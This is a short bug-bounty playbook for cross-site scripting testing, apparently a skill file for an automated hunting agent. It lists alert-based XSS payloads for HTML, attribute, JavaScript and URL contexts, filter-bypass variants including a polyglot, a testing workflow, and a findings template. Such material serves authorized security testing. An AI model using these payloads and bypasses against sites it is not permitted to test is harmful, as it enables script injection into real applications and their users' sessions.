# XSS Testing Playbook

## Overview
Cross-Site Scripting (XSS) testing methodology for bug bounty hunting.

## Testing Approach

### 1. Reconnaissance
- Identify all user-input points (parameters, headers, reflected values)
- Find existing JavaScript on the page
- Map out the application's URL structure

### 2. Payload Categories

**Reflected XSS**
- Test reflected parameters immediately
- Use context-aware payloads (HTML, attribute, JS, URL, etc.)

**Stored XSS**
- Find persistent storage (comments, profiles, posts)
- Verify payload persists and renders for other users

**DOM-Based XSS**
- Trace JavaScript execution from source to sink
- Identify `innerHTML`, `eval`, `document.write`, etc.

## Payloads by Context

### HTML Context
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Attribute Context
```html
" onload=alert(1) "
' onerror=alert(1) '
```

### JavaScript Context
```javascript
';alert(1);//
</script><script>alert(1)//
```

### URL Context
```javascript
javascript:alert(1)
//Data URL
data:text/html,<script>alert(1)</script>
```

## WAF Bypass Techniques

### Case Manipulation
```html
<ScRiPt>alert(1)</sCrIpT>
```

### Encoding
```html
&lt;script&gt; (HTML entities)
\u003cscript\u003e (Unicode)
%3Cscript%3E (URL)
```

### Fragment
```html
<script>alert(1)</script>
<!-- Works around some filters -->
```

### Polyglots
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//\x3cscript\x3ealert(1)//\x3c/script\x3e
```

## Testing Workflow

1. **Identify injection points** — parameters, headers, URL paths
2. **Test basic payload** — `<script>alert(1)</script>`
3. **Check reflection** — is it reflected in HTML or encoded?
4. **Adapt to context** — adjust payload for HTML vs JS vs attribute
5. **Bypass WAF if needed** — use mutator to generate variants
6. **Verify with PoC** — confirm execution with non-destructive alert

## Findings Format

When finding XSS, document:
```
## XSS Finding
- **Type**: Reflected/Stored/DOM
- **URL**: https://target.com/endpoint?param=value
- **Parameter**: param
- **Context**: HTML (where it reflects)
- **Payload**: <script>alert(1)</script>
- **PoC**: <link rel="import" href="...">
- **WAF Bypass**: None / Case manipulation / Encoding
```

## Files to Update
After finding XSS, write to:
```
~/Shared/bounty_recon/{program}/ghost/skills/xss/findings.md
```

Include: target URL, parameter, payload used, WAF observations, status (confirmed/potential).
